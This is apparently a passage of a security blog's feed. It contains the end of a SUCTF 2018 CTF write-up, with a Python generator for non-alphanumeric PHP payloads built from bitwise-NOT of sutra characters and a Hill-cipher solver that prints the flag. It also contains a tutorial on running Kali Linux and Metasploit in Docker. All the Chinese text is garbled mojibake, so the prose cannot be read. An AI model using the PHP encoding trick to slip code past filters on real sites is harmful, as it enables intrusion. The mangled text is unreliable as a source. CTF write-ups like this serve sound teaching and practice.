£Ëè©Ëê®Êë©ËØÉËê®„ÄÇÂñÑÂãáÁåõËè©Ëê®Êë©ËØÉËê®„ÄÇÊûÅÁ≤æËøõËè©Ëê®Êë©ËØÉËê®„ÄÇÂ∏∏Á≤æËøõËè©Ëê®Êë©ËØÉËê®„ÄÇÂ∏∏Âä†Ë°åËè©Ëê®Êë©ËØÉËê®„ÄÇ‰∏çËàçËΩ≠Ëè©Ëê®Êë©ËØÉËê®„ÄÇÊó•ËóèËè©Ëê®Êë©ËØÉËê®„ÄÇÊúàËóèËè©Ëê®Êë©ËØÉËê®„ÄÇÊó†ÊØîÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇËßÇËá™Âú®Ëè©Ëê®Êë©ËØÉËê®„ÄÇÂæóÂ§ßÂäøËè©Ëê®Êë©ËØÉËê®„ÄÇÂ¶ôÂêâÁ••Ëè©Ëê®Êë©ËØÉËê®„ÄÇÂÆùÂç∞ÊâãËè©Ëê®Êë©ËØÉËê®„ÄÇÊëßÈ≠îÂäõËè©Ëê®Êë©ËØÉËê®„ÄÇÈáëÂàöÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇÈáëÂàöËóèËè©Ëê®Êë©ËØÉËê®„ÄÇÂ∏∏‰∏æÊâãËè©Ëê®Êë©ËØÉËê®„ÄÇÂ§ßÊÇ≤ÂøÉËè©Ëê®Êë©ËØÉËê®„ÄÇÂ§ßÂ∫Ñ‰∏•Ëè©Ëê®Êë©ËØÉËê®„ÄÇÂ∫Ñ‰∏•ÁéãËè©Ëê®Êë©ËØÉËê®„ÄÇÂ±±Â≥∞Ëè©Ëê®Êë©ËØÉËê®„ÄÇÂÆùÂ≥∞Ëè©Ëê®Êë©ËØÉËê®„ÄÇÂæ∑ÁéãËè©Ëê®Êë©ËØÉËê®„ÄÇÊÖàÊ∞èËè©Ëê®Êë©ËØÉËê®„ÄÇÂ¶ÇÊòØÁ≠âÊó†ÈáèÁôæÂçÉ‰ø±ËÉùÈÇ£Â∫æÂ§öËè©Ëê®Êë©ËØÉËê®„ÄÇÁöÜÊ≥ïÁéãÂ≠êÂ†™Áªç‰Ωõ‰ΩçËÄå‰∏∫‰∏äÈ¶ñ„ÄÇÂ∞îÊó∂‰∏ñÂ∞ä‰∫éÂ∏àÂ≠êÂ∫ß‰∏ä„ÄÇËá™Êï∑Â∞ºÂ∏àÂùõÁªìË∑èË∂∫Âùê„ÄÇÁ´ØË∫´Ê≠£ÊÑø‰ΩèÂØπÈù¢Âøµ„ÄÇÂÖ•Á≠âÊåÅÁéãÂ¶ô‰∏âÊë©Âú∞„ÄÇËØ∏‰∏âÊë©Âú∞ÁöÜÊëÑÂÖ•Ê≠§‰∏âÊë©Âú∞‰∏≠„ÄÇÊòØÊâÄÊµÅÊïÖ„ÄÇÂ∞îÊó∂‰∏ñÂ∞äÊ≠£Áü•Ê≠£Âøµ„ÄÇ‰ªéÁ≠âÊåÅÁéãÂÆâÂ∫†ËÄåËµ∑„ÄÇ‰ª•ÂáÄÂ§©ÁúºËßÇÂØüÂçÅÊñπÊÆë‰ºΩÊ≤ôÁ≠âËØ∏‰Ωõ‰∏ñÁïå„ÄÇ‰∏æË∫´ÊÄ°ÊÇ¶„ÄÇ‰ªé‰∏§Ë∂≥‰∏ãÂçÉËæêËΩÆÁõ∏„ÄÇÂêÑÊîæÂÖ≠ÂçÅÁôæÂçÉ‰ø±ËÉùÈÇ£Â∫æÂ§öÂÖâ„ÄÇ‰ªéË∂≥ÂçÅÊåá„ÄÇ‰∏§Ë∂∫‰∏§Ë∑ü„ÄÇÂõõË∏ù‰∏§ËÉ´„ÄÇ‰∏§ËÖ®‰∏§ËÜù„ÄÇ‰∏§ËÇ°„ÄÇËÖ∞ËÉÅËÖπËÉå„ÄÇËÑê‰∏≠ÂøÉ‰∏äËÉ∏ËáÜÂæ∑Â≠ó„ÄÇ‰∏§‰π≥‰∏§ËÖã„ÄÇ‰∏§ËÇ©‰∏§È´Ü„ÄÇ‰∏§ËÇò‰∏§ËáÇ„ÄÇ‰∏§ËÖï‰∏§Êâã„ÄÇ‰∏§ÊéåÂçÅÊåá„ÄÇÈ°πÂíΩÈ¢êÈ¢î„ÄÇÈ¢äÈ¢ùÂ§¥È°∂‰∏§Áúâ‰∏§Áúº„ÄÇ‰∏§ËÄ≥‰∏§Èºª„ÄÇÂè£ÂõõÁâô„ÄÇÂõõÂçÅÈΩø„ÄÇÁúâÈó¥ÊØ´Áõ∏„ÄÇ‰∏Ä‰∏ÄË∫´ÂàÜ„ÄÇÂêÑÊîæÂÖ≠ÂçÅÁôæÂçÉ‰ø±ËÉùÈÇ£Â∫æÂ§öÂÖâ„ÄÇÊ≠§‰∏Ä‰∏ÄÂÖâÂêÑÁÖß‰∏âÂçÉÂ§ßÂçÉ‰∏ñÁïå„ÄÇ‰ªéÊ≠§Â±ïËΩ¨ÈÅçÁÖßÂçÅÊñπÊÆë‰ºΩÊ≤ôÁ≠âËØ∏‰Ωõ‰∏ñÁïå„ÄÇÂÖ∂‰∏≠ÊúâÊÉÖÈÅáÊñØÂÖâËÄÖ„ÄÇÂøÖÂæóÊó†‰∏äÊ≠£Á≠âËè©Êèê„ÄÇÂ∞îÊó∂‰∏ñÂ∞ä‰∏ÄÂàáÊØõÂ≠îÁöÜÊÇâÁÜôÊÄ°„ÄÇÂêÑÂá∫ÂÖ≠ÂçÅÁôæÂçÉ‰ø±ËÉùÈÇ£Â∫æÂ§öÂÖâ„ÄÇÊòØ‰∏Ä‰∏ÄÂÖâÂêÑÁÖß‰∏âÂçÉÂ§ßÂçÉ‰∏ñÁïå„ÄÇ‰ªéÊ≠§Â±ïËΩ¨ÈÅçÁÖßÂçÅÊñπÊÆë‰ºΩÊ≤ôÁ≠âËØ∏‰Ωõ‰∏ñÁïå„ÄÇÂÖ∂‰∏≠ÊúâÊÉÖÈÅáÊñØÂÖâËÄÖ„ÄÇÂøÖÂæóÊó†‰∏äÊ≠£Á≠âËè©Êèê„ÄÇÂ∞îÊó∂‰∏ñÂ∞äÊºîË∫´Â∏∏ÂÖâÁÖßÊ≠§‰∏âÂçÉÂ§ßÂçÉ‰∏ñÁïå„ÄÇ‰ªéÊ≠§Â±ïËΩ¨ÈÅçÁÖßÂçÅÊñπÊÆë‰ºΩÊ≤ôÁ≠âËØ∏‰ΩõÂõΩÂúü„ÄÇÂÖ∂‰∏≠ÊúâÊÉÖÈÅáÊñØÂÖâËÄÖ„ÄÇÂøÖÂæóÊó†‰∏äÊ≠£Á≠âËè©Êèê„ÄÇÂ∞îÊó∂‰∏ñÂ∞ä‰ªéÂÖ∂Èù¢Èó®Âá∫ÂπøÈïøËàåÁõ∏„ÄÇÈÅçË¶Ü‰∏âÂçÉÂ§ßÂçÉ‰∏ñÁïå„ÄÇÁÜôÊÄ°ÂæÆÁ¨ë„ÄÇÂ§ç‰ªéËàåÁõ∏ÊµÅÂá∫Êó†ÈáèÁôæÂçÉ‰ø±ËÉùÈÇ£Â∫æÂ§öÂÖâ„ÄÇÂÖ∂ÂÖâÊùÇËâ≤„ÄÇ‰ªéÊ≠§ÊùÇËâ≤‰∏Ä‰∏ÄÂÖâ‰∏≠„ÄÇÁé∞ÂÆùËé≤Ëä±„ÄÇÂÖ∂Ëä±ÂçÉÂè∂ÁöÜÁúüÈáëËâ≤„ÄÇ‰ºóÂÆùÂ∫Ñ‰∏•„ÄÇÁªÆÈ•∞È≤úËç£„ÄÇÁîöÂèØÁà±‰πê„ÄÇÈ¶ôÊ∞îËä¨ÁÉà„ÄÇÂë®ÊµÅÊôÆÁÜè„ÄÇÁªÜÊªëËΩªËΩØ„ÄÇËß¶ÁîüÂ¶ô‰πê„ÄÇËØ∏Ëä±Âè∞‰∏≠ÁöÜÊúâÂåñ‰ΩõÁªìË∑èË∂∫Âùê„ÄÇÊºîÂ¶ôÊ≥ïÈü≥„ÄÇ‰∏Ä‰∏ÄÊ≥ïÈü≥„ÄÇÁöÜËØ¥Ëà¨Ëã•Ê≥¢ÁΩóËúúÂ§öÁõ∏Â∫î‰πãÊ≥ï„ÄÇÊúâÊÉÖÈóªËÄÖÂøÖÂæóÊó†‰∏äÊ≠£Á≠âËè©Êèê„ÄÇ‰ªéÊ≠§Â±ïËΩ¨„ÄÇÊµÅÈÅçÂçÅÊñπÊÆë‰ºΩÊ≤ôÁ≠âËØ∏‰Ωõ‰∏ñÁïå„ÄÇËØ¥Ê≥ïÂà©Áõä‰∫¶Â§çÂ¶ÇÊòØ„ÄÇ"</span></span><br><span class="line">    parse_byte=<span class="keyword">lambda</span> c:[~i%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> bytes(c, encoding=<span class="string">'utf-8'</span>)][<span class="number">1</span>]</span><br><span class="line">    d=dict()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> sentence:</span><br><span class="line">        j=parse_byte(k)</span><br><span class="line">        <span class="keyword">if</span> chr(j) <span class="keyword">in</span> target_chars <span class="keyword">and</span> chr(j) <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">            d[chr(j)]=<span class="string">"~&#123;&#125;[&#123;&#125;]"</span>.format(k,index)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gencode</span><span class="params">(code)</span>:</span></span><br><span class="line">    d=gendict(index=<span class="string">'$_'</span>,target_chars=<span class="string">''</span>.join(set(code)))</span><br><span class="line">    res=<span class="string">'$__='</span>+<span class="string">'.'</span>.join(map(<span class="keyword">lambda</span> x:d[x],code))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=<span class="string">'@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~'</span></span><br><span class="line">print(gencode(code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;?php </span></span><br><span class="line"><span class="comment"># $_=_==_;</span></span><br><span class="line"><span class="comment"># $__=~‰ø±[$_].~Âæó[$_].~‰Ωè[$_].~‰ºΩ[$_].~Áªì[$_].~‰∫å[$_].~Èπ´[$_].~‰∏Ä[$_].~Â∑≤[$_].~Ë∂≥[$_].~ÊµÅ[$_].~Á¥¢[$_].~Â≥∞[$_].~Á≤æ[$_].~Â±±[$_].~Â∞Ω[$_].~ËØ∏[$_].~ÂÆ£[$_].~Ê≠£[$_].~Á¨¨[$_].~Á´ü[$_].~Ë™ì[$_].~È©¨[$_].~Ë®Ä[$_].~Ëß£[$_].~Â¶Ç[$_].~Á•û[$_].~Â§ß[$_].~Â£∞[$_].~Ê¢µ[$_].~È°∂[$_].~Â†™[$_].~Âüé[$_].~Êûú[$_].~Âùõ[$_].~Áúü[$_].~Áõ∏[$_].~ÁöÜ[$_].~Áôæ[$_].~ÊòØ[$_].~Èóª[$_].~ËñÑ[$_].~Êï∞[$_].~Áîü[$_].~Âìç[$_].~Âíå[$_].~Êë©[$_].~Ëê®[$_].~Âè∂[$_].~Áéã[$_].~ÂçÉ[$_].~Áåõ[$_].~Ëãæ[$_].~Âäû[$_].~ÊâÄ[$_].~Êàë[$_].~Ëá™[$_].~ÁÜô[$_].~ÊÖß[$_].~ËÑ±[$_].~ÁÉ¶[$_].~ÈÇ¨[$_].~ÊÅº[$_];</span></span><br><span class="line"><span class="comment"># var_dump($__);</span></span><br><span class="line"><span class="comment"># // string(63) "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>ÊäämagicËßÜ‰∏∫256x256ÁöÑÁî±0Ôºå1ÁªÑÊàêÁöÑÁü©ÈòµMÔºåÊääcipherËßÜ‰∏∫256x1ÁöÑÁü©ÈòµCÔºåÊääkeyËßÜ‰∏∫256x1ÁöÑÁü©ÈòµKÔºåÂ∑≤Áü•M,CÔºå‰∏îM*K = C (.mod 2)ÔºåÊ±ÇK„ÄÇ</p><p>ÂèØ‰ª•ÈááÁî®<code>Gauss-Jordan Ê∂àÂÖÉÊ≥ï</code> Â∞ÜÂ¢ûÂπøÁü©Èòµ<code>[M|C]</code> ÁÆÄÂåñ‰∏∫Ë°åÈò∂Ê¢ØÂΩ¢Áü©ÈòµÔºåÈÇ£‰πàÂèòÂåñÂêéÁöÑCÂ∞±ÊòØÊàë‰ª¨ÁöÑËß£K„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">read_to_int_array = <span class="keyword">lambda</span> x:[map(int,list(bin(int(line,<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> open(x).readlines()]</span><br><span class="line">cipher = read_to_int_array(<span class="string">'cipher.txt'</span>)[<span class="number">0</span>]</span><br><span class="line">magic = read_to_int_array(<span class="string">'magic.txt'</span>)</span><br><span class="line">dim=len(cipher)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> range(dim):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(col,dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span>:</span><br><span class="line">            magic[col],magic[row]=magic[row],magic[col]</span><br><span class="line">            cipher[col],cipher[row]=cipher[row],cipher[col]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span> <span class="keyword">and</span> row!=col:</span><br><span class="line">            <span class="keyword">for</span> each_in_row <span class="keyword">in</span> range(dim):</span><br><span class="line">                magic[row][each_in_row]^=magic[col][each_in_row]</span><br><span class="line">            cipher[row]^=cipher[col]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%hex(int(<span class="string">''</span>.join(map(str,cipher)),<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment">#flag&#123;Now_you_know_the_Hill_Cipher_xwg&#125;</span></span><br></pre></td></tr></table></figure><p>ÂèÇËÄÉÈìæÊé•Ôºö</p><ul><li><a href="https://blog.csdn.net/u010182633/article/details/45225179" target="_blank" rel="noopener">https://blog.csdn.net/u010182633/article/details/45225179</a> </li><li><a href="https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP" target="_blank" rel="noopener">https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP</a> </li><li>‰πüÂèØÂ∞ùËØïÂÄüÂä©matlabÁöÑ <a href="https://ww2.mathworks.cn/help/matlab/ref/rref.html" target="_blank" rel="noopener">rref</a> „ÄÇ</li></ul><h1 id="È¢òÁõÆÂ§á‰ªΩ"><a href="#È¢òÁõÆÂ§á‰ªΩ" class="headerlink" title="È¢òÁõÆÂ§á‰ªΩ"></a>È¢òÁõÆÂ§á‰ªΩ</h1><p><a href="https://github.com/findneo/ctfgodown/tree/master/20180527-suctf" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180527-suctf</a>    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;sandgame&quot;&gt;&lt;a href=&quot;#sandgame&quot; class=&quot;headerlink&quot; title=&quot;s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Âú®win10ÂÆ∂Â∫≠Áâà‰∏äÁöÑDocker‰∏≠‰ΩøÁî®Kali</title>
    <link href="https://findneo.github.io/180512KalionDocker/"/>
    <id>https://findneo.github.io/180512KalionDocker/</id>
    <published>2018-05-11T16:05:29.000Z</published>
    <updated>2019-01-25T23:21:37.008Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ÂÖ®Á®ãÈúÄ‰øùËØÅ‰øùËØÅÁΩëÁªúÁïÖÈÄö</strong></p><h1 id="ÂÆâË£ÖDocker"><a href="#ÂÆâË£ÖDocker" class="headerlink" title="ÂÆâË£ÖDocker"></a>ÂÆâË£ÖDocker</h1><ul><li><p>‰ªé <a href="https://docs.docker.com/toolbox/toolbox_install_windows/" target="_blank" rel="noopener">https://docs.docker.com/toolbox/toolbox_install_windows/</a> ‰∏ãËΩΩDockerToolbox.exe „ÄÇÂÖ≥Èó≠ÂÖ∂‰ªñÁ®ãÂ∫èÔºåÂè≥ÈîÆÁÆ°ÁêÜÂëòËøêË°åÔºåÈÄâÈ°πÂèØÂÖ®ÈÉ®‰øùÊåÅÈªòËÆ§ÔºàÂ¶ÇÊûúÁîµËÑë‰∏äÊú™ÂÆâË£ÖGitÔºåÂú®ÂÆâË£ÖËøáÁ®ã‰∏≠ÈúÄÊ≥®ÊÑèÂãæÈÄâÔºâ„ÄÇ</p></li><li><p>Ê°åÈù¢ÂèØÁúãÂà∞Âêç‰∏∫<code></code>Docker Quickstart Terminal`ÁöÑÂø´Êç∑ÊñπÂºèÔºåÂè≥ÈîÆÁÆ°ÁêÜÂëòËøêË°åÔºå<strong>Á≠âÂæÖÁõ¥Âà∞</strong>Âá∫Áé∞<strong>ÂèØ‰∫§‰∫íÂëΩ‰ª§Ë°å</strong>„ÄÇ</p></li></ul><h2 id="‰øÆÊîπÈªòËÆ§Â≠òÂÇ®‰ΩçÁΩÆÂà∞ÈùûÁ≥ªÁªüÁõò"><a href="#‰øÆÊîπÈªòËÆ§Â≠òÂÇ®‰ΩçÁΩÆÂà∞ÈùûÁ≥ªÁªüÁõò" class="headerlink" title="‰øÆÊîπÈªòËÆ§Â≠òÂÇ®‰ΩçÁΩÆÂà∞ÈùûÁ≥ªÁªüÁõò"></a>‰øÆÊîπÈªòËÆ§Â≠òÂÇ®‰ΩçÁΩÆÂà∞ÈùûÁ≥ªÁªüÁõò</h2><ul><li><p>Âú®‰∏ä‰∏ÄÊ≠•Âá∫Áé∞ÁöÑ<strong>ÂèØ‰∫§‰∫íÂëΩ‰ª§Ë°åÁïåÈù¢</strong>ËøêË°å <code>docker-machine.exe stop default</code> ÂÖ≥Èó≠Âü∫Á°ÄËôöÊãüÊú∫„ÄÇ</p></li><li><p>ËøêË°åÊ°åÈù¢‰∏äÂêç‰∏∫<code>Oracle VM VirtualBox</code> ÁöÑÂø´Êç∑ÊñπÂºè„ÄÇ</p><ul><li>Âú®<code>ÁÆ°ÁêÜ-&gt;ËôöÊãü‰ªãË¥®ÁÆ°ÁêÜÂô®„ÄêCTRL+D„Äë</code> ‰∏≠Â§çÂà∂<code>disk.vmdk</code> Âà∞DÁõò ÔºåÊ≥®ÊÑèÊúÄÂ•Ω‰øùÊåÅvmdk Ê†ºÂºè„ÄÇ</li><li>ÈÄâ‰∏≠<code>default</code> ËôöÊãüÊú∫ÔºåÂè≥ÈîÆ<code>ËÆæÁΩÆ-&gt;Â≠òÂÇ®-&gt;ÊéßÂà∂Âô®ÔºöSATA-&gt;Ê∑ªÂä†ËôöÊãüÁ°¨Áõò</code> ‰∏≠Ê∑ªÂä†DÁõòÁöÑ<code>disk.vmdk</code> „ÄÇÂà†Èô§CÁõòÁöÑ<code>disk.vmdk</code> „ÄÇ‰øùÂ≠òËÆæÁΩÆ„ÄÇ</li></ul></li><li><p>ÂõûÂà∞ ÂëΩ‰ª§Ë°åÔºåËøêË°å<code>docker-machine.exe start default</code> ÂêØÂä®Âü∫Á°ÄËôöÊãüÊú∫„ÄÇ</p></li></ul><h1 id="‰∏ãËΩΩKaliÂü∫Á°ÄÈïúÂÉèÂπ∂ÈÖçÁΩÆÂÆπÂô®"><a href="#‰∏ãËΩΩKaliÂü∫Á°ÄÈïúÂÉèÂπ∂ÈÖçÁΩÆÂÆπÂô®" class="headerlink" title="‰∏ãËΩΩKaliÂü∫Á°ÄÈïúÂÉèÂπ∂ÈÖçÁΩÆÂÆπÂô®"></a>‰∏ãËΩΩKaliÂü∫Á°ÄÈïúÂÉèÂπ∂ÈÖçÁΩÆÂÆπÂô®</h1><ul><li><p>Ôºà<strong>‰ª•‰∏ãÂëΩ‰ª§ÂùáÂú®‰∏äËø∞ÂëΩ‰ª§Ë°å‰∏≠ËæìÂÖ•</strong>Ôºâ</p></li><li><p><code>docker pull  kalilinux/kali-linux-docker</code>  ÊãâÂèñKaliÂü∫Á°ÄÈïúÂÉèÔºåÁ∫¶700+M„ÄÇ</p></li><li><p><code>docker run -it --name kali kalilinux/kali-linux-docker /bin/bash</code> Âü∫‰∫éËØ•ÈïúÂÉèÂêØÂä®‰∏Ä‰∏™ÂÆπÂô®Âπ∂ÂëΩÂêç‰∏∫<code>kali</code> „ÄÇ</p></li><li><p><code>apt update &amp;&amp; apt full-upgrade &amp;&amp; apt auto-remove &amp;&amp; apt-autoclean</code> ÂÆâË£ÖÂ∑•ÂÖ∑ÂâçÁöÑÂáÜÂ§áÂ∑•‰Ωú„ÄÇÊ≠§Â§ÑÊòØ<strong>‰∏ÄÂ∞èÊÆµÁ≠âÂæÖ</strong>„ÄÇ</p></li><li><p><code>apt install kali-linux-all</code> ÂÆâË£ÖKaliÁöÑÂ∑•ÂÖ∑ÂåÖ„ÄÇÊ≠§Â§ÑÊòØ<strong>Êº´ÈïøÁ≠âÂæÖ</strong>„ÄÇ Â¶ÇÊûúÊä•ÈîôÊåâÈîôËØØÊèêÁ§∫Êìç‰ΩúÂç≥ÂèØ„ÄÇ</p></li></ul><h2 id="ÈÖçÁΩÆmsfÊï∞ÊçÆÂ∫ì"><a href="#ÈÖçÁΩÆmsfÊï∞ÊçÆÂ∫ì" class="headerlink" title="ÈÖçÁΩÆmsfÊï∞ÊçÆÂ∫ì"></a>ÈÖçÁΩÆmsfÊï∞ÊçÆÂ∫ì</h2><ul><li><p><code>service postgresql start</code></p></li><li><p><code>su postgres</code></p></li><li><p><code>createuser username -P</code> ËÆæÁΩÆÊï∞ÊçÆÂ∫ìÁî®Êà∑Ë¥¶Êà∑ÂØÜÁ†Å</p></li><li><p><code>createdb --owner=username dbname &amp;&amp; exit</code>  ÂàõÂª∫Êï∞ÊçÆÂ∫ì</p></li><li><p><code>cd /usr/share/metasploit-framework/config &amp;&amp; cp database.yml.example database.yml &amp;&amp; vi database.yml</code>  Â°´Â•Ωusername,pass,dbname  „ÄÇ</p></li><li><p><code>msfconsole</code> </p><ul><li><code>db_status</code>  Êü•ÁúãÊï∞ÊçÆÂ∫ìËøûÊé•Áä∂ÊÄÅ</li><li><code>db_connect username:password@localhost/dbname</code>  //Ëã•Ê≤°ÊàêÂäüËøûÊé•Êï∞ÊçÆÂ∫ìÔºåÂàôÊâãÂä®ËøûÊé•</li></ul></li></ul><h1 id="Â∏∏Áî®Âü∫Êú¨Êìç‰Ωú"><a href="#Â∏∏Áî®Âü∫Êú¨Êìç‰Ωú" class="headerlink" title="Â∏∏Áî®Âü∫Êú¨Êìç‰Ωú"></a>Â∏∏Áî®Âü∫Êú¨Êìç‰Ωú</h1><h2 id="Êï∞ÊçÆÁÆ°ÁêÜ"><a href="#Êï∞ÊçÆÁÆ°ÁêÜ" class="headerlink" title="Êï∞ÊçÆÁÆ°ÁêÜ"></a>Êï∞ÊçÆÁÆ°ÁêÜ</h2><h3 id="Êñá‰ª∂‰º†Ëæì"><a href="#Êñá‰ª∂‰º†Ëæì" class="headerlink" title="Êñá‰ª∂‰º†Ëæì"></a>Êñá‰ª∂‰º†Ëæì</h3><ul><li><code>docker cp  kali:/root/testfile testfile</code> </li><li><code>docker cp test kali:/root/test</code> </li></ul><h3 id="Êï∞ÊçÆÂç∑"><a href="#Êï∞ÊçÆÂç∑" class="headerlink" title="Êï∞ÊçÆÂç∑"></a>Êï∞ÊçÆÂç∑</h3><ul><li><code>docker volume create my-vol</code> </li><li><code>docker volume ls</code></li><li><code>docker run --mount source=my-vol,target=/webapp ...</code> </li><li>ÂØπÂ∫îÁõÆÂΩïÊòØdefaultËôöÊãüÊú∫ÁöÑ<code>/var/lib/docker/volumes/my-vol</code> ÔºåÂπ∂‰∏çËÉΩÁõ¥Êé•Êìç‰ΩúÔºåÁêÜËÆ∫‰∏äÂ∫îËØ•ÂÖàÂú®ËôöÊãüÊú∫Âíå‰∏ªÊú∫Èó¥ÂÖ±‰∫´Êñá‰ª∂Â§πÔºåÁÑ∂ÂêéÂÜç‰ΩøÁî®Êï∞ÊçÆÂç∑„ÄÇ</li></ul><h3 id="ÊåÇËΩΩ‰∏ªÊú∫ÁõÆÂΩï"><a href="#ÊåÇËΩΩ‰∏ªÊú∫ÁõÆÂΩï" class="headerlink" title="ÊåÇËΩΩ‰∏ªÊú∫ÁõÆÂΩï"></a>ÊåÇËΩΩ‰∏ªÊú∫ÁõÆÂΩï</h3><ul><li><code>docker run --mount type=bind,source=/src/webapp,target=/opt/webapp ...</code>  </li></ul><h2 id="ÂØπÈïúÂÉè-image-ÁöÑÊìç‰Ωú"><a href="#ÂØπÈïúÂÉè-image-ÁöÑÊìç‰Ωú" class="headerlink" title="ÂØπÈïúÂÉè(image)ÁöÑÊìç‰Ωú"></a>ÂØπÈïúÂÉè(image)ÁöÑÊìç‰Ωú</h2><ul><li><p><code>docker search kali</code> Âú®Á∫øÊêúÁ¥¢ÈïúÂÉè„ÄÇ</p></li><li><p><code>docker pull kalilinux/kali-linux-docker</code>  ‰∏ãËΩΩÈïúÂÉè„ÄÇ</p></li><li><p><code>docker image ls [-a]</code> ÂàóÂá∫Êú¨Âú∞ÈïúÂÉè„ÄÇ</p></li><li><p><code>docker image rm kalilinux/kali-linux-docker</code>   Âà†Èô§Êú¨Âú∞ÈïúÂÉè„ÄÇ</p></li><li><p><code>docker commit -a findneo -m &quot;kali-all-tools installed;msfdb configured&quot; kali findneo/kali:v1</code> ÁîüÊàêÈïúÂÉè</p></li><li><p>‰øùÂ≠ò‰∏éÂä†ËΩΩÊú¨Âú∞ÈïúÂÉè</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">findneo/kali                  v1                  16b856910432        About an hour ago   13.2GB</span><br><span class="line">kalilinux/kali-linux-docker   latest              b8fe82f15421        2 months ago        749MB</span><br><span class="line"></span><br><span class="line">docker save -o D:\findneoandOriginKali.tar findneo/kali:v1 kalilinux/kali-linux-docker</span><br><span class="line">docker load -i D:\findneoandOriginKali.tar</span><br></pre></td></tr></table></figure></li></ul><h2 id="ÂØπÂÆπÂô®-container-ÁöÑÊìç‰Ωú"><a href="#ÂØπÂÆπÂô®-container-ÁöÑÊìç‰Ωú" class="headerlink" title="ÂØπÂÆπÂô®(container)ÁöÑÊìç‰Ωú"></a>ÂØπÂÆπÂô®(container)ÁöÑÊìç‰Ωú</h2><ul><li><code>docker run --rm kalilinux/kali-linux-docker /bin/echo &quot;hi&quot;</code><br>‰ª•<code>kalilinux/kali-linux-docker</code> ÈïúÂÉè‰∏∫Âü∫Á°ÄÂêØÂä®‰∏Ä‰∏™Êñ∞ÁöÑÂÆπÂô®ÔºåÊâßË°åÂëΩ‰ª§<code>/bin/echo &quot;hi&quot;</code> ÔºåÈÄÄÂá∫„ÄÅÁªàÊ≠¢Âπ∂Âà†Èô§ÂÆπÂô®„ÄÇ</li><li><p><code>docker run -it --name kali kalilinux/kali-linux-docker /bin/bash</code><br>‰ª•<code>kalilinux/kali-linux-docker</code> ÈïúÂÉè‰∏∫Âü∫Á°ÄÂêØÂä®‰∏Ä‰∏™Êñ∞ÁöÑÂÆπÂô®ÔºåÂëΩÂêç‰∏∫<code>kali</code> ÔºåÊèê‰æõbashÁªàÁ´Ø „ÄÇÊâßË°å<code>exit</code> Â∞ÜÈÄÄÂá∫„ÄÅÁªàÊ≠¢‰ΩÜ‰øùÁïôÂÆπÂô®„ÄÇ</p></li><li><p><code>docker start kali</code>   ÂêØÂä®Âêç‰∏∫<code>kali</code> ÁöÑÂÆπÂô®Âπ∂Âú®ÂêéÂè∞ËøêË°åÔºå<strong>Áõ∏ÂΩì‰∫éÂºÄÊú∫</strong> „ÄÇ<br><code>docker exec -it kali bash</code>   ËøõÂÖ•<code>kali</code> ÁöÑbashÁªàÁ´Ø„ÄÇÊâßË°å<code>exit</code> Â∞ÜÈÄÄÂá∫‰ΩÜ‰∏çÁªàÊ≠¢ÂÆπÂô®„ÄÇ<br><code>docker stop kali</code>    ÁªàÊ≠¢Âêç‰∏∫<code>kali</code> ÁöÑÂÆπÂô®Ôºå<strong>Áõ∏ÂΩì‰∫éÂÖ≥Êú∫</strong> „ÄÇ</p></li><li><p><code>docker container ls -a</code> ÂàóÂá∫ÊâÄÊúâÂÆπÂô®Ôºå‰∏çÂ∏¶<code>-a</code> 